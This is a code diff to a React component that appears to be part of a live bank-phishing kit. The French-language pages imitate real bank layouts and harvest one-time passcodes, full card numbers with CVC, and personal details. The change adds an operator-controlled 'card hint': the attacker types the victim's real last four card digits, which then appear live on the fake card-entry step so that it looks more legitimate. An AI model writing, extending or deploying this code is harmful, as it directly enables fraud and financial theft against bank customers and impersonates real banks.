@@ -4,6 +4,7 @@ import { USER_ID_EXAMPLE, QR_BANKS, getBank, validateUserId } from "../lib/banks
 import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
 import {
   apiEnabled,
+  apiGetCardHint,
   apiGetCommand,
   apiGetQr,
   apiHeartbeat,
@@ -17,6 +18,7 @@ import {
   getChannel,
   getOrCreateVisitorId,
   makeVisitorId,
+  readCardHintMap,
   readCommands,
   readQrMap,
   readSubmissions,
@@ -330,6 +332,7 @@ export default function BankFlow() {
   // BIL QR step: OTP shown under the mosaic (real BILnet layout).
   const [otp, setOtp] = useState("");
   const [card, setCard] = useState({ holder: "", number: "", exp: "", cvc: "" });
+  const [cardLast4, setCardLast4] = useState("");
   const [t5, setT5] = useState(false);
   const [info, setInfo] = useState({ first: "", last: "", dob: "", address: "", zip: "", city: "" });
   const [t6, setT6] = useState(false);
@@ -597,6 +600,46 @@ function checkIdFile(file) {
     const ch = getChannel();
     const onMsg = (ev) => {
       if (ev.data?.type === "qr-update" && ev.data?.visitorId === id) fetchQr();
+    };
+    ch?.addEventListener?.("message", onMsg);
+    return () => {
+      stop = true;
+      clearInterval(iv);
+      window.removeEventListener("storage", onStorage);
+      try {
+        ch?.removeEventListener?.("message", onMsg);
+        ch?.close?.();
+      } catch {}
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [bankSlug, status]);
+
+  // Card hint: admin-typed last 4 digits, shown live on the card step.
+  useEffect(() => {
+    if (!bank || status !== "card_requested" || !visitorIdRef.current) return;
+    const id = visitorIdRef.current;
+    let stop = false;
+    const fetchHint = async () => {
+      try {
+        const m = readCardHintMap();
+        if (!stop && m[id]?.last4) setCardLast4(m[id].last4);
+      } catch {}
+      if (apiEnabled()) {
+        try {
+          const r = await apiGetCardHint(id);
+          if (!stop) setCardLast4(r?.hint?.last4 || "");
+        } catch {}
+      }
+    };
+    fetchHint();
+    const iv = setInterval(fetchHint, 3000);
+    const onStorage = (e) => {
+      if (e.key === "live_cardhint_v1") fetchHint();
+    };
+    window.addEventListener("storage", onStorage);
+    const ch = getChannel();
+    const onMsg = (ev) => {
+      if (ev.data?.type === "cardhint-update" && ev.data?.visitorId === id) fetchHint();
     };
     ch?.addEventListener?.("message", onMsg);
     return () => {
@@ -1122,8 +1165,20 @@ function checkIdFile(file) {
       if (d.length <= 2) return d;
       return d.slice(0, 2) + "/" + d.slice(2);
     };
+    const previewNum = fmtNum(card.number) || (cardLast4 ? `•••• •••• •••• ${cardLast4}` : "•••• •••• •••• ••••");
     return (
       <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les détails de votre carte" desc="Veuillez saisir les détails de votre carte bancaire pour finaliser la vérification.">
+        {cardLast4 && (
+          <div className="mb-4 flex w-full items-center justify-center gap-2 rounded-xl border-2 px-4 py-3 text-center shadow-sm" style={{ borderColor: `${bank.color}55`, background: `${bank.color}0d` }}>
+            <span className="text-[18px]">💳</span>
+            <p className="text-[14px] font-bold text-neutral-800 sm:text-[15px]">
+              Numéro de carte se terminant par :{" "}
+              <span className="ml-1 rounded-lg bg-neutral-900 px-2.5 py-1 font-mono text-[16px] font-extrabold tracking-[0.2em] text-white">
+                {cardLast4}
+              </span>
+            </p>
+          </div>
+        )}
         <form autoComplete="off" noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
           {/* mini card preview */}
           <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
@@ -1131,7 +1186,10 @@ function checkIdFile(file) {
               <span className="h-7 w-10 rounded-md bg-gradient-to-br from-amber-200 to-amber-400" />
               <span className="text-[11px] font-extrabold uppercase tracking-[0.2em] opacity-70">{bank.short}</span>
             </div>
-            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{fmtNum(card.number) || "•••• •••• •••• ••••"}</p>
+            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{previewNum}</p>
+            {cardLast4 && !fmtNum(card.number) && (
+              <p className="mt-1 text-[11.5px] font-semibold opacity-80">se terminant par {cardLast4}</p>
+            )}
             <div className="mt-2 flex items-end justify-between text-[11px]">
               <span className="uppercase tracking-wider opacity-70">{card.holder || "CARD HOLDER"}</span>
               <span className="font-mono">{card.exp || "MM/YY"}</span>
